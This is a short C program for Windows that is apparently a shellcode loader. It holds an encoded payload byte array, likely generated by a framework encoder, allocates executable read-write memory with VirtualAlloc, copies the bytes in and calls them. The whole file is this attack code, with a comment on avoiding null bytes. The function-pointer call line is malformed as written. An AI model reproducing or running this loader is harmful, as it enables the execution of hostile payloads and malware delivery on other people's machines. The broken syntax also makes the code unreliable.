#include <windows.h>
//shellcode shouldn't have null characters as shellcode will not get fully copied
int main(){
	unsigned char shellcode [] = 
	"\xda\xd8\xd9\x74\x24\xf4\xba\x8b\x4b\xd9\x61\x58\x33\xc9\xb1"
	"\x52\x31\x50\x17\x83\xc0\x04\x03\xdb\x58\x3b\x94\x27\xb6\x39"
	"\x57\xd7\x47\x5e\xd1\x32\x76\x5e\x85\x37\x29\x6e\xcd\x15\xc6"
	"\x05\x83\x8d\x5d\x6b\x0c\xa2\xd6\xc6\x6a\x8d\xe7\x7b\x4e\x8c"
	"\x6b\x86\x83\x6e\x55\x49\xd6\x6f\x92\xb4\x1b\x3d\x4b\xb2\x8e"
	"\xd1\xf8\x8e\x12\x5a\xb2\x1f\x13\xbf\x03\x21\x32\x6e\x1f\x78"
	"\x94\x91\xcc\xf0\x9d\x89\x11\x3c\x57\x22\xe1\xca\x66\xe2\x3b"
	"\x32\xc4\xcb\xf3\xc1\x14\x0c\x33\x3a\x63\x64\x47\xc7\x74\xb3"
	"\x35\x13\xf0\x27\x9d\xd0\xa2\x83\x1f\x34\x34\x40\x13\xf1\x32"
	"\x0e\x30\x04\x96\x25\x4c\x8d\x19\xe9\xc4\xd5\x3d\x2d\x8c\x8e"
	"\x5c\x74\x68\x60\x60\x66\xd3\xdd\xc4\xed\xfe\x0a\x75\xac\x96"
	"\xff\xb4\x4e\x67\x68\xce\x3d\x55\x37\x64\xa9\xd5\xb0\xa2\x2e"
	"\x19\xeb\x13\xa0\xe4\x14\x64\xe9\x22\x40\x34\x81\x83\xe9\xdf"
	"\x51\x2b\x3c\x4f\x01\x83\xef\x30\xf1\x63\x40\xd9\x1b\x6c\xbf"
	"\xf9\x24\xa6\xa8\x90\xdf\x21\x17\xcc\xe7\xd9\xff\x0f\x17\x1b"
	"\xbc\x99\xf1\x71\xac\xcf\xaa\xed\x55\x4a\x20\x8f\x9a\x40\x4d"
	"\x8f\x11\x67\xb2\x5e\xd2\x02\xa0\x37\x12\x59\x9a\x9e\x2d\x77"
	"\xb2\x7d\xbf\x1c\x42\x0b\xdc\x8a\x15\x5c\x12\xc3\xf3\x70\x0d"
	"\x7d\xe1\x88\xcb\x46\xa1\x56\x28\x48\x28\x1a\x14\x6e\x3a\xe2"
	"\x95\x2a\x6e\xba\xc3\xe4\xd8\x7c\xba\x46\xb2\xd6\x11\x01\x52"
	"\xae\x59\x92\x24\xaf\xb7\x64\xc8\x1e\x6e\x31\xf7\xaf\xe6\xb5"
	"\x80\xcd\x96\x3a\x5b\x56\xa6\x70\xc1\xff\x2f\xdd\x90\xbd\x2d"
	"\xde\x4f\x81\x4b\x5d\x65\x7a\xa8\x7d\x0c\x7f\xf4\x39\xfd\x0d"
	"\x65\xac\x01\xa1\x86\xe5";
	void *exec = VirtualAlloc(0,sizeof(shellcode),MEM_COMMIT,PAGE_EXECUTE_READWRITE);
	memcpy(exec,shellcode,sizeof(shellcode));
	((void(*)())) exec()();
	return 0;
}
